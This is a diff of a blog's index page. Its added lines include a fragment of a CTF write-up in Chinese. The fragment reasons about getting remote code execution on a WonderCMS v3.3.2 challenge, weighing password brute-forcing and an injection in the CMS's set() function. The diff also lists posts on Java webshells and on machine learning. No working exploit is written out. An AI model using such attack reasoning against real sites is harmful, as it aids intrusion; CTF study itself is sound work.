+<p>只有<code>zzz_db</code>感觉有机会了 ，，，</p>
+<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`<span class="variable">$k</span>`</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="wondercms"><a href="#wondercms" class="headerlink" title="wondercms"></a>wondercms</h2><blockquote>
+<p>v3.3.2</p>
+</blockquote>
+<p>7ZFxu820</p>
+<p>首先 我们不知道password</p>
+<p>其次 我们要想办法 rce </p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220918114558499.png" alt="image-20220918114558499"></p>
+<p>由于代码比较短 所以我们一个一个来审</p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220918120314766.png" alt="image-20220918120314766"></p>
+<p>这里不知道能不能污染 等下在看</p>
+<p>大致能感觉到思路了 估计是打插件 包含</p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220918120539314.png" alt="image-20220918120539314"></p>
+<p>具体什么情况 估计还要搞个上传</p>
+<p>。。</p>
+<p>密码可以爆破吗。。。</p>
+<p>密码是八位</p>
+<p>大小写 + 数字 </p>
+<p>来！</p>
+<p>好像不太现实。。。</p>
+<p>password 存在 database.js 里面</p>
+<p>怎么拿出来？</p>
+<p>只有注入了 </p>
+<p>ok 来找一个注入，，， 貌似这里存在注入。。。</p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220918123015749.png" alt="image-20220918123015749"></p>
+<p>这个password加的盐能解吗</p>
+<p>我只能set 不能读啊啊啊</p>
+<p>而且 我不是admin 根本不村。。。乌鱼子</p>
+<p>还是乖乖审登录逻辑</p>
+<p><img src="/2022/09/17/HWCTF-2022WP/image-20220918123815832.png" alt="image-20220918123815832"></p>
+<p>这玩意好像会把密码改成test。。</p>
+<p>咋调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&#x27;confg&#x27;</span>, <span class="string">&#x27;lastLogins&#x27;</span>, <span class="title function_ invoke__">array_slice</span>(<span class="variable">$savedIPs</span>, <span class="number">0</span>, <span class="number">5</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$args</span> = <span class="title function_ invoke__">func_get_args</span>();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$value</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$args</span>);</span><br><span class="line">	<span class="variable">$lastKey</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$args</span>);</span><br><span class="line">	<span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;db;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$args</span> <span class="keyword">as</span> <span class="variable">$arg</span>) &#123;</span><br><span class="line">		<span class="variable">$data</span> = <span class="variable">$data</span>-&gt;&#123;<span class="variable">$arg</span>&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$data</span>-&gt;&#123;<span class="variable">$lastKey</span>&#125; = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/15/Javawebshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/09/15/Javawebshell/" class="post-title-link" itemprop="url">Javawebshell相关知识学习</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-09-15 20:44:50" itemprop="dateCreated datePublished" datetime="2022-09-15T20:44:50+08:00">2022-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-09-16 11:45:34" itemprop="dateModified" datetime="2022-09-16T11:45:34+08:00">2022-09-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>学一下java的相关的马 内存马单独拉出来讨论 这里不涉及</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/09/15/Javawebshell/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/15/run%E5%93%A5%E5%B8%A6%E4%BD%A0%E6%89%8B%E6%92%95%E5%86%B3%E7%AD%96%E6%A0%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/09/15/run%E5%93%A5%E5%B8%A6%E4%BD%A0%E6%89%8B%E6%92%95%E5%86%B3%E7%AD%96%E6%A0%91/" class="post-title-link" itemprop="url">run哥带你手撕决策树&Xgboost</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-09-15 14:01:21" itemprop="dateCreated datePublished" datetime="2022-09-15T14:01:21+08:00">2022-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-09-21 00:02:55" itemprop="dateModified" datetime="2022-09-21T00:02:55+08:00">2022-09-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>xgboost为比赛中的大杀器 今天又是节无聊的机器学习课 于是复习一下决策树加学一下xgboost</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/09/15/run%E5%93%A5%E5%B8%A6%E4%BD%A0%E6%89%8B%E6%92%95%E5%86%B3%E7%AD%96%E6%A0%91/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -341,9 +861,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-09-14 12:04:12 / Modified: 18:57:02" itemprop="dateCreated datePublished" datetime="2022-09-14T12:04:12+08:00">2022-09-14</time>
+      <time title="Created: 2022-09-14 12:04:12" itemprop="dateCreated datePublished" datetime="2022-09-14T12:04:12+08:00">2022-09-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-09-20 21:52:33" itemprop="dateModified" datetime="2022-09-20T21:52:33+08:00">2022-09-20</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -512,7 +1038,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-09-09 14:15:18" itemprop="dateModified" datetime="2022-09-09T14:15:18+08:00">2022-09-09</time>
+      <time title="Modified: 2022-09-14 22:51:13" itemprop="dateModified" datetime="2022-09-14T22:51:13+08:00">2022-09-14</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -654,7 +1180,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/09/08/NLP-Word2Vec/" class="post-title-link" itemprop="url">NLP-Word2Vec</a>
+          <a href="/2022/09/08/NLP-Word2Vec/" class="post-title-link" itemprop="url">NLP系列之run哥带你手撕Word2Vec</a>
         </h2>
 
         <div class="post-meta-container">
@@ -667,80 +1193,12 @@
 
       <time title="Created: 2022-09-08 16:31:57" itemprop="dateCreated datePublished" datetime="2022-09-08T16:31:57+08:00">2022-09-08</time>
     </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/08/run%E5%93%A5%E5%B8%A6%E4%BD%A0%E6%89%8B%E5%86%99KNN/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.jpeg">
-      <meta itemprop="name" content="b1ue0cean">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="b1ue0cean's   blog">
-      <meta itemprop="description" content="我就是我，人间不一样的烟火">
-    </span>
-    
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | b1ue0cean's   blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/09/08/run%E5%93%A5%E5%B8%A6%E4%BD%A0%E6%89%8B%E5%86%99KNN/" class="post-title-link" itemprop="url">run哥带你手写KNN</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2022-09-08 14:12:49" itemprop="dateCreated datePublished" datetime="2022-09-08T14:12:49+08:00">2022-09-08</time>
-    </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-09-14 22:34:54" itemprop="dateModified" datetime="2022-09-14T22:34:54+08:00">2022-09-14</time>
+      <time title="Modified: 2022-09-15 19:33:01" itemprop="dateModified" datetime="2022-09-15T19:33:01+08:00">2022-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -748,7 +1206,7 @@
       </span>
       <span class="post-meta-item-text">In</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">机器学习</span></a>
+          <a href="/categories/NLP/" itemprop="url" rel="index"><span itemprop="name">NLP</span></a>
         </span>
     </span>
 
@@ -762,279 +1220,10 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>一个老师布置的任务 也是在这个老师的课上无聊 懒得听 玩玩</p>
+          <p>来聊聊NLP中的经典模型 word2vec</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2022/09/08/run%E5%93%A5%E5%B8%A6%E4%BD%A0%E6%89%8B%E5%86%99KNN/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/07/%E5%8D%B7%E7%A7%AF%E7%9A%84%E9%80%9A%E4%BF%97%E8%A7%A3%E9%87%8A/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.jpeg">
-      <meta itemprop="name" content="b1ue0cean">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="b1ue0cean's   blog">
-      <meta itemprop="description" content="我就是我，人间不一样的烟火">
-    </span>
-    
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | b1ue0cean's   blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/09/07/%E5%8D%B7%E7%A7%AF%E7%9A%84%E9%80%9A%E4%BF%97%E8%A7%A3%E9%87%8A/" class="post-title-link" itemprop="url">卷积&傅里叶的通俗解释</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2022-09-07 09:58:33" itemprop="dateCreated datePublished" datetime="2022-09-07T09:58:33+08:00">2022-09-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-09-14 22:35:56" itemprop="dateModified" datetime="2022-09-14T22:35:56+08:00">2022-09-14</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/math/" itemprop="url" rel="index"><span itemprop="name">math</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>最近在学数字信号处理 老是用到卷积 今天读到一篇文章 很好的解释了卷积的意义  让我有种豁然开朗的感觉</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/palet/article/details/88862647">https://blog.csdn.net/palet/article/details/88862647</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/palet/article/details/88862647">https://blog.csdn.net/palet/article/details/88862647</a></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/09/07/%E5%8D%B7%E7%A7%AF%E7%9A%84%E9%80%9A%E4%BF%97%E8%A7%A3%E9%87%8A/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/25/CTFZONE2022/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.jpeg">
-      <meta itemprop="name" content="b1ue0cean">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="b1ue0cean's   blog">
-      <meta itemprop="description" content="我就是我，人间不一样的烟火">
-    </span>
-    
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | b1ue0cean's   blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/08/25/CTFZONE2022/" class="post-title-link" itemprop="url">CTFZONE2022</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2022-08-25 00:00:05" itemprop="dateCreated datePublished" datetime="2022-08-25T00:00:05+08:00">2022-08-25</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-09-06 11:07:40" itemprop="dateModified" datetime="2022-09-06T11:07:40+08:00">2022-09-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          Here's something encrypted, password is required to continue reading.
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/08/25/CTFZONE2022/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/24/dicectf2022/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.jpeg">
-      <meta itemprop="name" content="b1ue0cean">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="b1ue0cean's   blog">
-      <meta itemprop="description" content="我就是我，人间不一样的烟火">
-    </span>
-    
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | b1ue0cean's   blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/08/24/dicectf2022/" class="post-title-link" itemprop="url">dicectf2022复现</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2022-08-24 12:00:58" itemprop="dateCreated datePublished" datetime="2022-08-24T12:00:58+08:00">2022-08-24</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-09-14 22:37:05" itemprop="dateModified" datetime="2022-09-14T22:37:05+08:00">2022-09-14</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          Here's something encrypted, password is required to continue reading.
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/08/24/dicectf2022/#more" rel="contents">
+              <a class="btn" href="/2022/09/08/NLP-Word2Vec/#more" rel="contents">
                 Read more &raquo;
               </a>
             </div>
@@ -1058,7 +1247,7 @@
 
 
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 </div>
